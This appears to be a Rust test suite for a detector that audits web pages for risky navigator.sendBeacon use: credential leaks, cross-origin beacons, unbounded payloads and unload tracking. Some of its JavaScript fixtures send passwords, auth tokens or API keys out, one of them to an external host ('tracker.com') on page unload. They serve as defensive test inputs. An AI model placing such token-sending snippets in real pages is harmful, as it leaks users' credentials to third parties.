use crate::beacon_api_audit::*;

#[test]
fn test_empty_body() {
    let issues = analyze_beacon_api("");
    assert_eq!(issues, Vec::new());
}

#[test]
fn test_no_api() {
    let body = r#"
        <script>
            console.log("No beacon API here");
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert_eq!(issues, Vec::new());
}

#[test]
fn test_api_detected() {
    let body = r#"
        <script>
            navigator.sendBeacon('/log', data);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert_eq!(issues.len(), 1);
    assert_eq!(issues[0], BeaconApiIssue::ApiDetected);
}

#[test]
fn test_api_detected_short_form() {
    let body = r#"
        <script>
            sendBeacon('/endpoint', payload);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(issues.contains(&BeaconApiIssue::ApiDetected));
}

#[test]
fn test_sensitive_data_leak_password() {
    let body = r#"
        <script>
            navigator.sendBeacon('/track', JSON.stringify({password: pwd}));
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(issues.contains(&BeaconApiIssue::ApiDetected));
    assert!(issues.contains(&BeaconApiIssue::SensitiveDataLeak));
}

#[test]
fn test_sensitive_data_leak_token() {
    let body = r#"
        <script>
            const token = getAuthToken();
            navigator.sendBeacon('/api', token);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(issues.contains(&BeaconApiIssue::SensitiveDataLeak));
}

#[test]
fn test_sensitive_data_leak_api_key() {
    let body = r#"
        <script>
            sendBeacon('/log', {apiKey: key});
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(issues.contains(&BeaconApiIssue::SensitiveDataLeak));
}

#[test]
fn test_no_sensitive_data_leak() {
    let body = r#"
        <script>
            navigator.sendBeacon('/metrics', {count: 42});
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(!issues.contains(&BeaconApiIssue::SensitiveDataLeak));
}

#[test]
fn test_cross_origin_beacon() {
    let body = r#"
        <script>
            navigator.sendBeacon('https://external.com/track', data);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(issues.contains(&BeaconApiIssue::CrossOriginBeacon));
}

#[test]
fn test_cross_origin_with_same_origin_guard() {
    let body = r#"
        <script>
            const url = location.origin + '/beacon';
            navigator.sendBeacon(url, data);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(!issues.contains(&BeaconApiIssue::CrossOriginBeacon));
}

#[test]
fn test_no_cross_origin_beacon() {
    let body = r#"
        <script>
            navigator.sendBeacon('/relative/path', data);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(!issues.contains(&BeaconApiIssue::CrossOriginBeacon));
}

#[test]
fn test_unbounded_payload() {
    let body = r#"
        <script>
            const payload = JSON.stringify(largeObject);
            navigator.sendBeacon('/log', payload);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(issues.contains(&BeaconApiIssue::UnboundedPayload));
}

#[test]
fn test_unbounded_payload_formdata() {
    let body = r#"
        <script>
            const fd = new FormData();
            fd.append('data', bigData);
            sendBeacon('/track', fd);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(issues.contains(&BeaconApiIssue::UnboundedPayload));
}

#[test]
fn test_bounded_payload() {
    let body = r#"
        <script>
            const payload = JSON.stringify(data).slice(0, 1024);
            navigator.sendBeacon('/log', payload);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(!issues.contains(&BeaconApiIssue::UnboundedPayload));
}

#[test]
fn test_unload_tracking() {
    let body = r#"
        <script>
            window.addEventListener('beforeunload', () => {
                navigator.sendBeacon('/analytics', trackingData);
            });
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(issues.contains(&BeaconApiIssue::UnloadTracking));
}

#[test]
fn test_unload_tracking_pagehide() {
    let body = r#"
        <script>
            document.addEventListener('pagehide', () => {
                sendBeacon('/metrics', log);
            });
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(issues.contains(&BeaconApiIssue::UnloadTracking));
}

#[test]
fn test_no_unload_tracking_missing_event() {
    let body = r#"
        <script>
            navigator.sendBeacon('/analytics', data);
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(!issues.contains(&BeaconApiIssue::UnloadTracking));
}

#[test]
fn test_no_unload_tracking_missing_tracking_keyword() {
    let body = r#"
        <script>
            window.addEventListener('beforeunload', () => {
                navigator.sendBeacon('/save', data);
            });
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert!(!issues.contains(&BeaconApiIssue::UnloadTracking));
}

#[test]
fn test_severity_values() {
    assert_eq!(beacon_api_severity(&BeaconApiIssue::ApiDetected), 2.0);
    assert_eq!(beacon_api_severity(&BeaconApiIssue::SensitiveDataLeak), 7.5);
    assert_eq!(beacon_api_severity(&BeaconApiIssue::CrossOriginBeacon), 6.5);
    assert_eq!(beacon_api_severity(&BeaconApiIssue::UnboundedPayload), 5.5);
    assert_eq!(beacon_api_severity(&BeaconApiIssue::UnloadTracking), 6.0);
}

#[test]
fn test_display_strings() {
    assert_eq!(BeaconApiIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        BeaconApiIssue::SensitiveDataLeak.to_string(),
        "sensitive_data_leak"
    );
    assert_eq!(
        BeaconApiIssue::CrossOriginBeacon.to_string(),
        "cross_origin_beacon"
    );
    assert_eq!(
        BeaconApiIssue::UnboundedPayload.to_string(),
        "unbounded_payload"
    );
    assert_eq!(
        BeaconApiIssue::UnloadTracking.to_string(),
        "unload_tracking"
    );
}

#[test]
fn test_to_operations_count() {
    let issues = vec![
        BeaconApiIssue::ApiDetected,
        BeaconApiIssue::SensitiveDataLeak,
        BeaconApiIssue::CrossOriginBeacon,
    ];
    let mut seq = 100;
    let ops = beacon_api_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 103);
}

#[test]
fn test_to_operations_empty() {
    let issues = vec![];
    let mut seq = 50;
    let ops = beacon_api_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 50);
}

#[test]
fn test_multiple_issues() {
    let body = r#"
        <script>
            window.addEventListener('beforeunload', () => {
                const data = JSON.stringify({token: authToken});
                navigator.sendBeacon('https://tracker.com/log', data);
            });
        </script>
    "#;
    let issues = analyze_beacon_api(body);
    assert_eq!(issues.len(), 5);
    assert!(issues.contains(&BeaconApiIssue::ApiDetected));
    assert!(issues.contains(&BeaconApiIssue::SensitiveDataLeak));
    assert!(issues.contains(&BeaconApiIssue::CrossOriginBeacon));
    assert!(issues.contains(&BeaconApiIssue::UnboundedPayload));
    assert!(issues.contains(&BeaconApiIssue::UnloadTracking));
}
